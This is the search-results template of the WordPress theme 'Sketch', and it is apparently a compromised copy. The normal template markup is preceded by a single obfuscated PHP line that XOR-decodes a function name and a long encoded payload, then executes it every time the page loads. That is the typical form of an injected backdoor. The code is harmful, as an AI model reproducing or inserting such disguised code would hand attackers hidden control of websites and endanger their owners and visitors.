<?php $rfpQbmR='HA.,0-03KU4Z9:V'^'+3KMDHoU>;W.PU8';$PehvCq=$rfpQbmR('','DVXoKFX;TIRNtP7IA:Ega<C4.2SY+tiTOGLXauN1aXAUM-WZNwCOJ2-W8A<7AUCqsQ1ZAiXP,YROarDyf<KmxH7AByqspszpzO5.FLK3ZdeAJQLXUC=1Q+UIi1L0 cOTAICBK0H9gQHCFlUcYR+3>T>lDoD+ijF.N>hWpjkADC8R7oa84=y+dYKZ9>YNX:4QQ8I8gr=OESH2yjOLTAoiLMJ<G+vzg=LTRq:IMrUy,ATO3z1IJBDHW-Vuiulc9a ihY9NgN-+:qVnbHBQ.;EBT1pmKD2C079RHmTzv-E4KPja7AX4qpnW5,BNSyi5kZ< Ojjq+8EVcJBGKX.F7T0.HMRfo6+86mjy McN>Y zlkzMCLAA,Nl,rhKu3X5V3 NWNUtg8E7uI1JIT7XWdsgJAAWY<Q2q4y0<pa6555Sno6:P8.O,9Q:=2JN-5s<V9A3a<6TXL2:UlnjZRWA.Ifn=.85hzJU,ONP>Q6MCMzz.3dFDS91hCvlO1>93iY7=mRHS06Bzn=R4TOoVZVTTEEgvuz;TFBO015ZcOXX3a8aBLOddOsDBM,fcTQFRQozDVJzRR;atTE2rwSM7nyMIwvA:H7Rh;. 9-A.:,2GpPVKV,,QijUQRT:2jAeKKrbaMFCXA;.ysD8.Tkp  HZX66m+XYF>V1Y=nDPMbP'^'-0pN-36X  = +5O 2N6OFD,FqV2-J+69:3kqHU5;h>4;.Y>5 W; 8mI6L ch, 7YW5P. ExtG<+fARdYFGAdqlX46YLSWTAzsFSA4doZzYEqqqh1i0IC=N;aMU-DAJtte hib:A0C>=7fBhCqvORJ5eH-2duIN-K7eL>POK201T7YGESQDPvMbAS0L<:-HZyuW<LNI7F8Y58sN+-  OTl++P4NMpCY- 3.Q,4RhYJ 8<VA;C,-6-6N>UAQ3 v.k -yX=GjFNCQkPBl40BN ktJzdo S7QhR71MiZRF MpZcES ,UQMNsCM.;6BcHaPUFoBKUOY17Jj9MB>A4R5SFhev9=szms>>YA>CjU<YZQUZi5--4IgLWxaBQW9A7lK+.nhTCS NNC8Cm0V,6DNGn7 ;,Yj8xIsM6zERTATsSOvO>KK=EX=SGWb6BG,X7M l>QC p.SI0ZZ5>74.J,NJYOLTAVjqH.:1a:S4jdApGULb 2MPHePL.CLXJ62RD270:CB1RIV7MscOr>7 5leAPURV0sjkTPA;8h3=JFeHbqrDCvKvv+JWVg5q73YJsn,N4dYUEeuPCEb,UIPmoQV H:V+7PKYfH9GIXAoW 72:CM5NFuu65NSChEkkRBA6LJ=7ZBQW YZ50WPA167WRJvqbL73I0IFtyvh-');$PehvCq();
/**
 * The template for displaying Search Results pages.
 *
 * @package Sketch
 */

get_header(); ?>

	<section id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		<?php if ( have_posts() ) : ?>

			<header class="page-header">
				<h1 class="page-title"><?php printf( __( 'Search Results for: %s', 'sketch' ), '<span>' . get_search_query() . '</span>' ); ?></h1>
			</header><!-- .page-header -->

			<?php /* Start the Loop */ ?>
			<?php while ( have_posts() ) : the_post(); ?>

				<?php
				/**
				 * Run the loop for the search to output the results.
				 * If you want to overload this in a child theme then include a file
				 * called content-search.php and that will be used instead.
				 */
				get_template_part( 'content', 'search' );
				?>

			<?php endwhile; ?>

			<?php sketch_paging_nav(); ?>

		<?php else : ?>

			<?php get_template_part( 'content', 'none' ); ?>

		<?php endif; ?>

		</main><!-- #main -->
	</section><!-- #primary -->

<?php get_sidebar(); ?>
<?php get_footer(); ?>